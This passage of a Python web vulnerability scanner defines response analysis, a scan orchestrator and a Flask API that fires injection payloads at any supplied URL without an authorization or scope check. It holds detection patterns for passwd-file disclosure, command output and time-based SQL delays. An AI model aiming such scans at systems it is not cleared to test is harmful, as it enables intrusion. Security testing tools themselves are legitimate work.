        return any(ctx in full_context for ctx in dangerous_contexts)
    
    async def _ai_analyze_response(self, response, payload: str, vulnerability: VulnerabilityResult) -> Dict:
        """AI analysis of response for vulnerability detection"""
        if not self.ai_engine or not HAS_AI:
            return {'is_vulnerable': False, 'confidence': 0.0}
        
        try:
            # Extract features for AI analysis
            features = {
                'response_length': len(response.text),
                'status_code': response.status_code,
                'payload_length': len(payload),
                'response_time': vulnerability.response_time,
                'has_error_indicators': len(vulnerability.error_indicators) > 0,
                'payload_reflected': payload in response.text,
                'special_chars_ratio': sum(1 for c in payload if not c.isalnum()) / len(payload) if payload else 0,
            }
            
            # Use AI model for prediction
            if hasattr(self.ai_engine, 'predict_vulnerability'):
                prediction = self.ai_engine.predict_vulnerability(features)
                return {
                    'is_vulnerable': prediction['is_vulnerable'],
                    'confidence': prediction['confidence'],
                    'features': features,
                    'prediction': prediction.get('vulnerability_type', 'unknown')
                }
            
        except Exception as e:
            logger.error(f"AI analysis error: {e}")
        
        return {'is_vulnerable': False, 'confidence': 0.0}

class ResponseAnalysisEngine:
    """Advanced response analysis and correlation"""
    
    def __init__(self, ai_engine=None, nlp_processor=None):
        self.ai_engine = ai_engine
        self.nlp_processor = nlp_processor
        self.response_cache = {}
        self.anomaly_detector = IsolationForest(contamination=0.1) if HAS_AI else None
        self.baseline_responses = {}
        
        # Response patterns for analysis
        self.error_patterns = self._load_error_patterns()
        self.success_patterns = self._load_success_patterns()
        
        logger.info("Response analysis engine initialized")
    
    def _load_error_patterns(self) -> Dict:
        """Load comprehensive error patterns"""
        return {
            'database_errors': [
                r'mysql_fetch_array\(\)',
                r'ORA-\d{5}',
                r'Microsoft.*ODBC.*SQL Server',
                r'PostgreSQL.*ERROR',
                r'SQLite.*error',
                r'sqlite3\.OperationalError',
                r'MySQLSyntaxErrorException',
                r'SQL syntax.*error',
                r'Warning.*\Wmysql_.*',
                r'valid MySQL result',
                r'quoted string not properly terminated'
            ],
            'web_server_errors': [
                r'Internal Server Error',
                r'HTTP/1\.[01] 500',
                r'Apache.*Error',
                r'nginx.*error',
                r'IIS.*Error',
                r'Tomcat.*Exception',
                r'JBoss.*Exception',
                r'WebLogic.*Exception'
            ],
            'programming_errors': [
                r'Fatal error:',
                r'Parse error:',
                r'Warning:.*on line',
                r'Notice:.*on line',
                r'Uncaught exception',
                r'java\.lang\.',
                r'python.*traceback',
                r'ruby.*error',
                r'node\.js.*error',
                r'PHP.*error'
            ],
            'system_errors': [
                r'command not found',
                r'is not recognized as an internal',
                r'permission denied',
                r'access denied',
                r'cannot access',
                r'file not found',
                r'directory not found',
                r'permission denied'
            ],
            'security_errors': [
                r'access.*denied',
                r'unauthorized',
                r'forbidden',
                r'authentication.*failed',
                r'invalid.*credentials',
                r'session.*expired',
                r'csrf.*token.*invalid',
                r'security.*violation'
            ]
        }
    
    def _load_success_patterns(self) -> Dict:
        """Load success indication patterns"""
        return {
            'login_success': [
                r'welcome.*back',
                r'login.*successful',
                r'authenticated.*successfully',
                r'dashboard',
                r'profile.*page',
                r'logout.*link',
                r'welcome.*user'
            ],
            'command_success': [
                r'root:.*:0:0:',
                r'uid=\d+.*gid=\d+',
                r'Linux.*\d+\.\d+\.\d+',
                r'Windows.*Version',
                r'total \d+',
                r'drwx',
                r'-rw-'
            ],
            'file_disclosure': [
                r'<?php',
                r'function.*\(',
                r'class.*\{',
                r'import.*from',
                r'require.*\(',
                r'include.*\(',
                r'#include.*<',
                r'using.*namespace'
            ],
            'information_disclosure': [
                r'version.*\d+\.\d+',
                r'server:.*apache',
                r'server:.*nginx',
                r'powered.*by',
                r'x-powered-by',
                r'framework.*version',
                r'database.*version'
            ]
        }
    
    async def analyze_response(self, response: requests.Response, payload: str, vulnerability_type: str) -> Dict:
        """Comprehensive response analysis"""
        analysis_result = {
            'is_vulnerable': False,
            'confidence': 0.0,
            'evidence': [],
            'anomaly_score': 0.0,
            'timing_analysis': {},
            'content_analysis': {},
            'error_analysis': {},
            'ai_analysis': {}
        }
        
        if not response:
            return analysis_result
        
        try:
            # Basic response metrics
            response_metrics = {
                'status_code': response.status_code,
                'response_size': len(response.text),
                'response_time': getattr(response, 'response_time', 0),
                'headers': dict(response.headers)
            }
            
            # Error pattern analysis
            error_analysis = self._analyze_error_patterns(response.text, vulnerability_type)
            analysis_result['error_analysis'] = error_analysis
            
            # Content analysis
            content_analysis = self._analyze_content(response.text, payload, vulnerability_type)
            analysis_result['content_analysis'] = content_analysis
            
            # Timing analysis
            timing_analysis = await self._analyze_timing(response, payload)
            analysis_result['timing_analysis'] = timing_analysis
            
            # Anomaly detection
            if self.anomaly_detector and HAS_AI:
                anomaly_score = self._detect_anomalies(response_metrics)
                analysis_result['anomaly_score'] = anomaly_score
            
            # AI/ML analysis
            if self.ai_engine and HAS_AI:
                ai_analysis = await self._ai_response_analysis(response, payload, vulnerability_type)
                analysis_result['ai_analysis'] = ai_analysis
            
            # NLP analysis for text content
            if self.nlp_processor and HAS_AI:
                nlp_analysis = await self._nlp_analysis(response.text, payload)
                analysis_result['nlp_analysis'] = nlp_analysis
            
            # Combine all analyses for final verdict
            final_analysis = self._combine_analyses(
                error_analysis, content_analysis, timing_analysis,
                analysis_result.get('anomaly_score', 0),
                analysis_result.get('ai_analysis', {}),
                analysis_result.get('nlp_analysis', {})
            )
            
            analysis_result.update(final_analysis)
            
        except Exception as e:
            logger.error(f"Response analysis error: {e}")
        
        return analysis_result
    
    def _analyze_error_patterns(self, response_text: str, vulnerability_type: str) -> Dict:
        """Analyze error patterns in response"""
        error_analysis = {
            'has_errors': False,
            'error_types': [],
            'error_patterns': [],
            'confidence': 0.0
        }
        
        for error_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    error_analysis['has_errors'] = True
                    error_analysis['error_types'].append(error_type)
                    error_analysis['error_patterns'].append(pattern)
        
        # Calculate confidence based on error relevance to vulnerability type
        if error_analysis['has_errors']:
            relevance_map = {
                'sql_injection': ['database_errors', 'programming_errors'],
                'xss': ['programming_errors', 'web_server_errors'],
                'command_injection': ['system_errors', 'programming_errors'],
                'file_inclusion': ['system_errors', 'programming_errors'],
                'ssrf': ['web_server_errors', 'system_errors']
            }
            
            relevant_errors = relevance_map.get(vulnerability_type, [])
            relevant_count = sum(1 for err_type in error_analysis['error_types'] if err_type in relevant_errors)
            
            if relevant_count > 0:
                error_analysis['confidence'] = min(0.9, 0.3 + (relevant_count * 0.2))
            else:
                error_analysis['confidence'] = 0.1
        
        return error_analysis
    
    def _analyze_content(self, response_text: str, payload: str, vulnerability_type: str) -> Dict:
        """Analyze response content for vulnerability indicators"""
        content_analysis = {
            'payload_reflected': False,
            'payload_executed': False,
            'information_disclosed': False,
            'success_indicators': [],
            'confidence': 0.0
        }
        
        # Check payload reflection
        if payload in response_text:
            content_analysis['payload_reflected'] = True
            content_analysis['confidence'] += 0.3
        
        # Check for success patterns based on vulnerability type
        success_patterns = self.success_patterns.get(f"{vulnerability_type}_success", [])
        if vulnerability_type == 'command_injection':
            success_patterns = self.success_patterns['command_success']
        elif vulnerability_type == 'file_inclusion':
            success_patterns = self.success_patterns['file_disclosure']
        elif vulnerability_type in ['sql_injection', 'xss']:
            success_patterns = self.success_patterns['information_disclosure']
        
        for pattern in success_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                content_analysis['payload_executed'] = True
                content_analysis['success_indicators'].append(pattern)
                content_analysis['confidence'] += 0.4
        
        # Check for information disclosure
        for pattern in self.success_patterns['information_disclosure']:
            if re.search(pattern, response_text, re.IGNORECASE):
                content_analysis['information_disclosed'] = True
                content_analysis['confidence'] += 0.2
        
        content_analysis['confidence'] = min(1.0, content_analysis['confidence'])
        return content_analysis
    
    async def _analyze_timing(self, response: requests.Response, payload: str) -> Dict:
        """Analyze response timing for time-based vulnerabilities"""
        timing_analysis = {
            'is_delayed': False,
            'delay_amount': 0.0,
            'baseline_difference': 0.0,
            'confidence': 0.0
        }
        
        response_time = getattr(response, 'response_time', 0)
        
        # Check for intentional delays (sleep, waitfor, etc.)
        delay_indicators = ['sleep(', 'waitfor delay', 'pg_sleep(', 'benchmark(']
        has_delay_indicator = any(indicator in payload.lower() for indicator in delay_indicators)
        
        if has_delay_indicator and response_time > 4.0:  # 4+ second delay
            timing_analysis['is_delayed'] = True
            timing_analysis['delay_amount'] = response_time
            timing_analysis['confidence'] = min(0.95, 0.7 + (response_time - 4.0) * 0.05)
        
        return timing_analysis
    
    def _detect_anomalies(self, response_metrics: Dict) -> float:
        """Detect anomalies in response using machine learning"""
        if not self.anomaly_detector or not HAS_AI:
            return 0.0
        
        try:
            # Convert metrics to feature vector
            features = [
                response_metrics['status_code'],
                response_metrics['response_size'],
                response_metrics.get('response_time', 0),
                len(response_metrics['headers'])
            ]
            
            # Detect anomaly
            anomaly_score = self.anomaly_detector.decision_function([features])[0]
            return max(0.0, min(1.0, (anomaly_score + 0.5)))  # Normalize to 0-1
            
        except Exception as e:
            logger.debug(f"Anomaly detection error: {e}")
            return 0.0
    
    async def _ai_response_analysis(self, response: requests.Response, payload: str, vulnerability_type: str) -> Dict:
        """AI-powered response analysis"""
        ai_analysis = {
            'vulnerability_probability': 0.0,
            'features_extracted': {},
            'model_prediction': 'safe',
            'confidence': 0.0
        }
        
        if not self.ai_engine or not HAS_AI:
            return ai_analysis
        
        try:
            # Extract advanced features
            features = {
                'response_length': len(response.text),
                'status_code': response.status_code,
                'payload_length': len(payload),
                'special_chars_ratio': sum(1 for c in payload if not c.isalnum()) / len(payload) if payload else 0,
                'html_tags_count': len(re.findall(r'<[^>]+>', response.text)),
                'script_tags_count': len(re.findall(r'<script[^>]*>', response.text, re.IGNORECASE)),
                'error_keywords_count': sum(1 for word in ['error', 'exception', 'warning', 'fatal'] 
                                           if word in response.text.lower()),
                'sql_keywords_count': sum(1 for word in ['select', 'union', 'where', 'from'] 
                                        if word in response.text.lower()),
                'payload_reflected': payload in response.text,
                'response_entropy': self._calculate_entropy(response.text)
            }
            
            ai_analysis['features_extracted'] = features
            
            # Use AI model for prediction if available
            if hasattr(self.ai_engine, 'predict_vulnerability'):
                prediction = self.ai_engine.predict_vulnerability(features, vulnerability_type)
                ai_analysis.update(prediction)
            
        except Exception as e:
            logger.error(f"AI response analysis error: {e}")
        
        return ai_analysis
    
    async def _nlp_analysis(self, response_text: str, payload: str) -> Dict:
        """NLP analysis of response text"""
        nlp_analysis = {
            'sentiment_score': 0.0,
            'suspicious_entities': [],
            'language_detected': 'unknown',
            'readability_score': 0.0,
            'confidence': 0.0
        }
        
        if not self.nlp_processor or not HAS_AI:
            return nlp_analysis
        
        try:
            # Use NLP processor for advanced text analysis
            if hasattr(self.nlp_processor, 'analyze_text_for_vulnerabilities'):
                analysis = self.nlp_processor.analyze_text_for_vulnerabilities(response_text, payload)
                nlp_analysis.update(analysis)
            
        except Exception as e:
            logger.error(f"NLP analysis error: {e}")
        
        return nlp_analysis
    
    def _calculate_entropy(self, text: str) -> float:
        """Calculate Shannon entropy of text"""
        if not text:
            return 0.0
        
        # Count character frequencies
        char_counts = defaultdict(int)
        for char in text:
            char_counts[char] += 1
        
        # Calculate entropy
        text_length = len(text)
        entropy = 0.0
        
        for count in char_counts.values():
            if count > 0:
                probability = count / text_length
                entropy -= probability * math.log2(probability)
        
        return entropy
    
    def _combine_analyses(self, error_analysis: Dict, content_analysis: Dict, 
                         timing_analysis: Dict, anomaly_score: float,
                         ai_analysis: Dict, nlp_analysis: Dict) -> Dict:
        """Combine all analyses for final vulnerability assessment"""
        
        # Weighted scoring system
        weights = {
            'error_confidence': 0.25,
            'content_confidence': 0.30,
            'timing_confidence': 0.20,
            'anomaly_score': 0.10,
            'ai_confidence': 0.10,
            'nlp_confidence': 0.05
        }
        
        total_confidence = 0.0
        evidence = []
        
        # Error analysis contribution
        if error_analysis.get('has_errors'):
            total_confidence += error_analysis['confidence'] * weights['error_confidence']
            evidence.extend([f"Error pattern: {pattern}" for pattern in error_analysis['error_patterns']])
        
        # Content analysis contribution
        if content_analysis.get('payload_executed') or content_analysis.get('payload_reflected'):
            total_confidence += content_analysis['confidence'] * weights['content_confidence']
            if content_analysis.get('payload_reflected'):
                evidence.append("Payload reflected in response")
            if content_analysis.get('payload_executed'):
                evidence.append("Payload execution detected")
        
        # Timing analysis contribution
        if timing_analysis.get('is_delayed'):
            total_confidence += timing_analysis['confidence'] * weights['timing_confidence']
            evidence.append(f"Response delayed by {timing_analysis['delay_amount']:.2f}s")
        
        # Anomaly detection contribution
        if anomaly_score > 0.5:
            total_confidence += anomaly_score * weights['anomaly_score']
            evidence.append(f"Anomalous response detected (score: {anomaly_score:.2f})")
        
        # AI analysis contribution
        if ai_analysis.get('confidence', 0) > 0.5:
            total_confidence += ai_analysis['confidence'] * weights['ai_confidence']
            evidence.append(f"AI model prediction: {ai_analysis.get('model_prediction', 'unknown')}")
        
        # NLP analysis contribution
        if nlp_analysis.get('confidence', 0) > 0.5:
            total_confidence += nlp_analysis['confidence'] * weights['nlp_confidence']
            evidence.append("NLP analysis indicates vulnerability")
        
        # Determine vulnerability status
        is_vulnerable = total_confidence > 0.6  # Threshold for vulnerability
        
        return {
            'is_vulnerable': is_vulnerable,
            'confidence': min(1.0, total_confidence),
            'evidence': evidence,
            'combined_score': total_confidence
        }

class ScanOrchestrationEngine:
    """Main scan orchestration and management system"""
    
    def __init__(self):
        # Initialize all components
        self.ai_engine = None
        self.nlp_processor = None
        self.cv_analyzer = None
        self.threading_manager = None
        self.connection_pool = None
        
        # Initialize engines
        self.detection_engine = VulnerabilityDetectionEngine()
        self.response_analyzer = ResponseAnalysisEngine()
        self.payload_db = PayloadDatabase()
        
        # Scan management
        self.active_scans = {}
        self.scan_queue = queue.PriorityQueue()
        self.results_cache = {}
        
        # Performance metrics
        self.scan_stats = defaultdict(int)
        self.performance_metrics = defaultdict(list)
        
        logger.info("Scan orchestration engine initialized")
    
    def initialize_advanced_components(self):
        """Initialize AI/ML and threading components"""
        try:
            # Initialize AI/ML components
            if HAS_AI:
                from advanced_ai_ml_engine import (
                    DeepLearningVulnDetector, ComputerVisionAnalyzer, 
                    AdvancedNLPProcessor, MLOpsManager
                )
                
                self.ai_engine = DeepLearningVulnDetector()
                self.nlp_processor = AdvancedNLPProcessor()
                self.cv_analyzer = ComputerVisionAnalyzer()
                
                # Update detection and analysis engines
                self.detection_engine.ai_engine = self.ai_engine
                self.detection_engine.nlp_processor = self.nlp_processor
                self.response_analyzer.ai_engine = self.ai_engine
                self.response_analyzer.nlp_processor = self.nlp_processor
                
                logger.info("AI/ML components initialized successfully")
            
            # Initialize threading components
            from advanced_threading_engine import (
                AdvancedConnectionPool, IntelligentTaskQueue,
                LoadBalancer, AutoScaler, DistributedTaskManager
            )
            
            self.connection_pool = AdvancedConnectionPool()
            self.task_queue = IntelligentTaskQueue()
            self.load_balancer = LoadBalancer()
            self.auto_scaler = AutoScaler()
            
            logger.info("Advanced threading components initialized successfully")
            
        except ImportError as e:
            logger.warning(f"Some advanced components not available: {e}")
    
    async def start_comprehensive_scan(self, target_config: Dict) -> str:
        """Start a comprehensive vulnerability scan"""
        scan_id = str(uuid.uuid4())
        
        try:
            # Validate target configuration
            if not self._validate_target_config(target_config):
                raise ValueError("Invalid target configuration")
            
            # Create scan task
            scan_task = {
                'scan_id': scan_id,
                'target_url': target_config['target_url'],
                'scan_types': target_config.get('scan_types', ['all']),
                'parameters': target_config.get('parameters', ['id', 'page', 'file', 'url']),
                'depth': target_config.get('depth', 2),
                'max_threads': target_config.get('max_threads', 50),
                'timeout': target_config.get('timeout', 30),
                'aggressive': target_config.get('aggressive', False),
                'started_at': datetime.now(),
                'status': 'starting'
            }
            
            self.active_scans[scan_id] = scan_task
            
            # Start scan in background
            asyncio.create_task(self._execute_comprehensive_scan(scan_task))
            
            logger.info(f"Comprehensive scan started: {scan_id}")
            return scan_id
            
        except Exception as e:
            logger.error(f"Failed to start scan: {e}")
            raise
    
    async def _execute_comprehensive_scan(self, scan_task: Dict):
        """Execute comprehensive vulnerability scan"""
        scan_id = scan_task['scan_id']
        
        try:
            self.active_scans[scan_id]['status'] = 'running'
            
            # Phase 1: Target reconnaissance
            logger.info(f"[{scan_id}] Starting target reconnaissance")
            target_info = await self._target_reconnaissance(scan_task)
            
            # Phase 2: Parameter discovery
            logger.info(f"[{scan_id}] Starting parameter discovery")
            parameters = await self._discover_parameters(scan_task, target_info)
            
            # Phase 3: Vulnerability testing
            logger.info(f"[{scan_id}] Starting vulnerability testing")
            vulnerabilities = await self._test_vulnerabilities(scan_task, parameters, target_info)
            
            # Phase 4: AI/ML analysis
            if self.ai_engine:
                logger.info(f"[{scan_id}] Starting AI/ML analysis")
                ai_results = await self._ai_ml_analysis(vulnerabilities, target_info)
                vulnerabilities.extend(ai_results)
            
            # Phase 5: Computer vision analysis (for screenshots)
            if self.cv_analyzer and HAS_CV:
                logger.info(f"[{scan_id}] Starting computer vision analysis")
                cv_results = await self._computer_vision_analysis(scan_task, target_info)
                vulnerabilities.extend(cv_results)
            
            # Phase 6: Report generation
            logger.info(f"[{scan_id}] Generating comprehensive report")
            report = await self._generate_comprehensive_report(scan_task, vulnerabilities, target_info)
            
            # Update scan status
            self.active_scans[scan_id].update({
                'status': 'completed',
                'completed_at': datetime.now(),
                'vulnerabilities_found': len(vulnerabilities),
                'report': report
            })
            
            # Update statistics
            self.scan_stats['completed_scans'] += 1
            self.scan_stats['total_vulnerabilities'] += len(vulnerabilities)
            
            logger.info(f"[{scan_id}] Scan completed successfully. Found {len(vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            logger.error(f"[{scan_id}] Scan failed: {e}")
            self.active_scans[scan_id].update({
                'status': 'failed',
                'error': str(e),
                'completed_at': datetime.now()
            })
    
    async def _target_reconnaissance(self, scan_task: Dict) -> Dict:
        """Perform target reconnaissance"""
        target_url = scan_task['target_url']
        target_info = {
            'base_url': target_url,
            'technology_stack': [],
            'server_info': {},
            'security_headers': {},
            'cookies': {},
            'forms': [],
            'endpoints': [],
            'subdomains': []
        }
        
        try:
            # Basic HTTP reconnaissance
            response = requests.get(target_url, timeout=10, allow_redirects=True)
            
            # Extract server information
            target_info['server_info'] = {
                'status_code': response.status_code,
                'server': response.headers.get('Server', 'Unknown'),
                'powered_by': response.headers.get('X-Powered-By', 'Unknown'),
                'content_type': response.headers.get('Content-Type', 'Unknown')
            }
            
            # Security headers analysis
            security_headers = [
                'Content-Security-Policy', 'X-Frame-Options', 'X-XSS-Protection',
                'X-Content-Type-Options', 'Strict-Transport-Security',
                'Referrer-Policy', 'Feature-Policy'
            ]
            
            for header in security_headers:
                target_info['security_headers'][header] = response.headers.get(header, 'Missing')
            
            # Technology detection
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Detect technologies from HTML
            technologies = []
            
            # Meta tags
            for meta in soup.find_all('meta'):
                if meta.get('name') == 'generator':
                    technologies.append(meta.get('content', ''))
            
            # Script sources
            for script in soup.find_all('script', src=True):
                src = script['src']
                if 'jquery' in src.lower():
                    technologies.append('jQuery')
                elif 'bootstrap' in src.lower():
                    technologies.append('Bootstrap')
                elif 'react' in src.lower():
                    technologies.append('React')
                elif 'angular' in src.lower():
                    technologies.append('Angular')
            
            target_info['technology_stack'] = list(set(technologies))
            
            # Form discovery
            forms = []
            for form in soup.find_all('form'):
                form_info = {
                    'method': form.get('method', 'GET').upper(),
                    'action': form.get('action', ''),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    form_info['inputs'].append({
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    })
                
                forms.append(form_info)
            
            target_info['forms'] = forms
            
            # Extract cookies
            target_info['cookies'] = dict(response.cookies)
            
        except Exception as e:
            logger.error(f"Target reconnaissance error: {e}")
        
        return target_info
    
    async def _discover_parameters(self, scan_task: Dict, target_info: Dict) -> List[str]:
        """Discover parameters for testing"""
        parameters = scan_task['parameters'].copy()
        
        # Common parameter names
        common_params = [
            'id', 'page', 'file', 'url', 'path', 'dir', 'action', 'cmd', 'exec',
            'query', 'search', 'q', 'keyword', 'term', 'data', 'input', 'value',
            'name', 'user', 'username', 'email', 'password', 'token', 'key',
            'category', 'type', 'format', 'lang', 'locale', 'redirect', 'return',
            'callback', 'jsonp', 'api', 'ajax', 'xml', 'json', 'debug', 'test'
        ]
        
        # Add parameters from forms
        for form in target_info.get('forms', []):
            for input_field in form.get('inputs', []):
                param_name = input_field.get('name', '')
                if param_name and param_name not in parameters:
                    parameters.append(param_name)
        
        # Add common parameters
        for param in common_params:
            if param not in parameters:
                parameters.append(param)
        
        return parameters[:20]  # Limit to top 20 parameters
    
    async def _test_vulnerabilities(self, scan_task: Dict, parameters: List[str], target_info: Dict) -> List[VulnerabilityResult]:
        """Test for vulnerabilities across all types"""
        vulnerabilities = []
        target_url = scan_task['target_url']
        scan_types = scan_task['scan_types']
        
        if 'all' in scan_types:
            scan_types = ['sql_injection', 'xss', 'command_injection', 'file_inclusion', 'ssrf', 'auth_bypass']
        
        # Create tasks for concurrent testing
        tasks = []
        
        for vuln_type in scan_types:
            for parameter in parameters:
                task = self._test_vulnerability_type(target_url, parameter, vuln_type, target_info)
                tasks.append(task)
        
        # Execute tasks with controlled concurrency
        max_concurrent = scan_task.get('max_threads', 50)
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def limited_task(task):
            async with semaphore:
                return await task
        
        results = await asyncio.gather(*[limited_task(task) for task in tasks], return_exceptions=True)
        
        # Collect results
        for result in results:
            if isinstance(result, list):
                vulnerabilities.extend(result)
            elif isinstance(result, Exception):
                logger.error(f"Vulnerability testing error: {result}")
        
        return vulnerabilities
    
    async def _test_vulnerability_type(self, target_url: str, parameter: str, vuln_type: str, target_info: Dict) -> List[VulnerabilityResult]:
        """Test specific vulnerability type"""
        try:
            # Get payloads for vulnerability type
            payloads = self.payload_db.get_top_payloads(vuln_type, limit=10)
            
            # Add mutations based on target info
            mutated_payloads = []
            for payload in payloads:
                mutations = self.payload_db.mutate_payload(payload, target_info)
                mutated_payloads.extend(mutations[:3])  # Limit mutations per payload
            
            all_payloads = payloads + mutated_payloads
            
            # Test vulnerability
            if vuln_type == 'sql_injection':
                results = await self.detection_engine.detect_sql_injection(target_url, parameter, all_payloads)
            elif vuln_type == 'xss':
                results = await self.detection_engine.detect_xss(target_url, parameter, all_payloads)
            elif vuln_type == 'command_injection':
                results = await self.detection_engine.detect_command_injection(target_url, parameter, all_payloads)
            elif vuln_type == 'file_inclusion':
                results = await self.detection_engine.detect_file_inclusion(target_url, parameter, all_payloads)
            elif vuln_type == 'ssrf':
                results = await self.detection_engine.detect_ssrf(target_url, parameter, all_payloads)
            else:
                results = []
            
            # Enhanced analysis for each result
            enhanced_results = []
            for result in results:
                if result.confidence > 0.6:  # Only high-confidence results
                    # Perform additional analysis
                    response = await self.detection_engine._send_request(target_url, parameter, result.payload)
                    if response:
                        analysis = await self.response_analyzer.analyze_response(response, result.payload, vuln_type)
                        
                        # Update result with enhanced analysis
                        result.ai_confidence = analysis.get('ai_analysis', {}).get('confidence', 0)
                        result.risk_score = self._calculate_risk_score(result, analysis)
                        result.business_impact = self._assess_business_impact(result, target_info)
                        result.remediation = self._generate_remediation(result)
                    
                    enhanced_results.append(result)
                    
                    # Update payload effectiveness
                    self.payload_db.update_effectiveness(result.payload, True)
            
            return enhanced_results
            
        except Exception as e:
            logger.error(f"Vulnerability type testing error ({vuln_type}): {e}")
            return []
    
    def _calculate_risk_score(self, vulnerability: VulnerabilityResult, analysis: Dict) -> float:
        """Calculate comprehensive risk score"""
        base_scores = {
            'sql_injection': 0.9,
            'xss': 0.7,
            'command_injection': 0.95,
            'file_inclusion': 0.8,
            'ssrf': 0.75,
            'auth_bypass': 0.85
        }
        
        base_score = base_scores.get(vulnerability.vulnerability_type, 0.5)
        confidence_multiplier = vulnerability.confidence
        ai_multiplier = 1.0 + (vulnerability.ai_confidence * 0.2)
        
        risk_score = base_score * confidence_multiplier * ai_multiplier
        return min(1.0, risk_score)
    
    def _assess_business_impact(self, vulnerability: VulnerabilityResult, target_info: Dict) -> str:
        """Assess business impact of vulnerability"""
        high_impact_types = ['sql_injection', 'command_injection', 'auth_bypass']
        medium_impact_types = ['file_inclusion', 'ssrf']
        
        if vulnerability.vulnerability_type in high_impact_types:
            return 'high'
        elif vulnerability.vulnerability_type in medium_impact_types:
            return 'medium'
        else:
            return 'low'
    
    def _generate_remediation(self, vulnerability: VulnerabilityResult) -> str:
        """Generate remediation advice"""
        remediation_map = {
            'sql_injection': "Use parameterized queries, input validation, and escape user input. Implement proper error handling.",
            'xss': "Implement output encoding, input validation, and Content Security Policy (CSP). Use HTML sanitization.",
            'command_injection': "Use parameterized commands, input validation, and avoid system calls with user input.",
            'file_inclusion': "Implement whitelist-based file access, input validation, and avoid dynamic file includes.",
            'ssrf': "Implement URL validation, use allowlists for external requests, and network segmentation.",
            'auth_bypass': "Implement proper authentication mechanisms, session management, and access controls."
        }
        
        return remediation_map.get(vulnerability.vulnerability_type, "Implement proper input validation and security controls.")
    
    def _validate_target_config(self, config: Dict) -> bool:
        """Validate scan target configuration"""
        required_fields = ['target_url']
        
        for field in required_fields:
            if field not in config:
                return False
        
        # Validate URL format
        try:
            parsed = urlparse(config['target_url'])
            return parsed.scheme in ['http', 'https'] and parsed.netloc
        except:
            return False
    
    def get_scan_status(self, scan_id: str) -> Dict:
        """Get scan status and results"""
        return self.active_scans.get(scan_id, {'status': 'not_found'})
    
    def get_scan_statistics(self) -> Dict:
        """Get scanning statistics"""
        return dict(self.scan_stats)

class EnterpriseSecurityScanner:
    """Complete Enterprise Security Scanner - Fully Integrated"""
    
    def __init__(self, config_path: str = None):
        self.config = self._load_configuration(config_path)
        
        # Initialize core components
        self.orchestration_engine = ScanOrchestrationEngine()
        self.detection_engine = VulnerabilityDetectionEngine()
        self.response_analyzer = ResponseAnalysisEngine()
        self.payload_db = PayloadDatabase()
        
        # Initialize Flask app
        self.app = Flask(__name__)
        self.app.config.update(self.config['flask'])
        
        # Initialize extensions
        self.socketio = SocketIO(self.app, cors_allowed_origins="*", async_mode='threading')
        self.cors = CORS(self.app)
        self.jwt = JWTManager(self.app)
        self.limiter = Limiter(self.app, key_func=get_remote_address)
        
        # Initialize advanced components
        self._initialize_advanced_components()
        
        # Setup routes
        self._setup_routes()
        
        # Setup WebSocket events
        self._setup_websocket_events()
        
        logger.info("🏆 Enterprise Security Scanner fully initialized")
    
    def _load_configuration(self, config_path: str) -> Dict:
        """Load scanner configuration"""
        default_config = {
            'flask': {
                'SECRET_KEY': secrets.token_hex(32),
                'JWT_SECRET_KEY': secrets.token_hex(32),
                'JWT_ACCESS_TOKEN_EXPIRES': timedelta(hours=24),
                'JSON_SORT_KEYS': False
            },
            'scanner': {
                'max_concurrent_scans': 100,
                'default_timeout': 30,
                'max_payloads_per_type': 50,
                'enable_ai_analysis': True,
                'enable_cv_analysis': True,
                'rate_limit': '100/minute'
            },
            'security': {
                'enable_csrf_protection': True,
                'enable_cors': True,
                'allowed_origins': ['*'],
                'secure_headers': True
            }
        }
        
        # Load custom config if provided
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    custom_config = json.load(f)
                    default_config.update(custom_config)
            except Exception as e:
                logger.warning(f"Failed to load config: {e}")
        
        return default_config
    
    def _initialize_advanced_components(self):
        """Initialize all advanced components"""
        try:
            # Initialize orchestration engine advanced components
            self.orchestration_engine.initialize_advanced_components()
            
            logger.info("✅ All advanced components initialized successfully")
            
        except Exception as e:
            logger.error(f"Failed to initialize advanced components: {e}")
    
    def _setup_routes(self):
        """Setup Flask routes for the scanner"""
        
        @self.app.route('/')
        def dashboard():
            """Main dashboard"""
            return render_template_string(DASHBOARD_HTML)
        
        @self.app.route('/api/health')
        def health_check():
            """Health check endpoint"""
            return jsonify({
                'status': 'healthy',
                'timestamp': datetime.now().isoformat(),
                'version': '2.0.0',
                'components': {
                    'detection_engine': 'active',
                    'orchestration_engine': 'active',
                    'response_analyzer': 'active',
                    'payload_database': 'active',
                    'ai_engine': 'active' if self.orchestration_engine.ai_engine else 'inactive',
                    'threading_engine': 'active' if self.orchestration_engine.connection_pool else 'inactive'
                }
            })
        
        @self.app.route('/api/scan/start', methods=['POST'])
        @self.limiter.limit(self.config['scanner']['rate_limit'])
        def start_scan():
            """Start a new vulnerability scan"""
            try:
                scan_config = request.get_json()
                
                if not scan_config or 'target_url' not in scan_config:
                    return jsonify({'error': 'Invalid scan configuration'}), 400
                
                # Start comprehensive scan
                scan_id = asyncio.run(self.orchestration_engine.start_comprehensive_scan(scan_config))
                
                return jsonify({
                    'scan_id': scan_id,
                    'status': 'started',
                    'message': 'Comprehensive vulnerability scan initiated'
                }), 200
                
            except Exception as e:
                logger.error(f"Scan start error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/scan/<scan_id>/status')
        def get_scan_status(scan_id: str):
            """Get scan status and results"""
            try:
                status = self.orchestration_engine.get_scan_status(scan_id)
                return jsonify(status)
                
            except Exception as e:
                logger.error(f"Scan status error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/scan/<scan_id>/report')
        def get_scan_report(scan_id: str):
            """Get comprehensive scan report"""
            try:
                scan_data = self.orchestration_engine.get_scan_status(scan_id)
                
                if scan_data['status'] != 'completed':
                    return jsonify({'error': 'Scan not completed'}), 400
                
                report = scan_data.get('report', {})
                return jsonify(report)
                
            except Exception as e:
                logger.error(f"Report generation error: {e}")
                return jsonify({'error': str(e)}), 500
        
        @self.app.route('/api/payloads/<vuln_type>')
        def get_payloads(vuln_type: str):
